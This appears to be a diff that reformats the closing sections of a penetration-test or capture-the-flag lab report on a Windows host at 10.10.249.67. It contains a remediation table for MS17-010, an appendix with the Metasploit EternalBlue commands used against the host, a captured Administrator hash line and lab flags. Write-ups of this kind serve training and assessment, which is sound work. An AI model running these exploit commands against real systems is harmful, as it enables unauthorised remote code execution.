@@ -89,7 +89,7 @@ The assessment followed a standard methodology:
 
 ## Remediation Summary
 
-| Finding                      | Host           | Severity | Recommended Remediation                              |
+| Finding                     | Host           | Severity | Recommended Remediation                              |
 |-----------------------------|----------------|----------|------------------------------------------------------|
 | User-Level File Disclosure  | 10.10.249.67   | Low      | Lock down world-readable directories                 |
 | MS17-010 RCE                | 10.10.249.67   | Critical | Patch system (MS17-010), disable SMBv1               |
@@ -101,20 +101,20 @@ The assessment followed a standard methodology:
 
 ### A. Exploitation Commands
 
-``bash
 
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 10.10.249.67
-set LHOST tun0
-run
+
+    use exploit/windows/smb/ms17_010_eternalblue
+    set RHOSTS 10.10.249.67
+    set LHOST tun0
+    run
 
 ### B. Captured Hashes
 
-`bash
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
-###   Collected Flags 
-    lag1.txt: FLAG{US3R_SH3LL_0WN3D}
+**Collected Flags**
+
+    flag1.txt: FLAG{US3R_SH3LL_0WN3D}
 
     flag2.txt: FLAG{SYST3M_R00T3D}
 
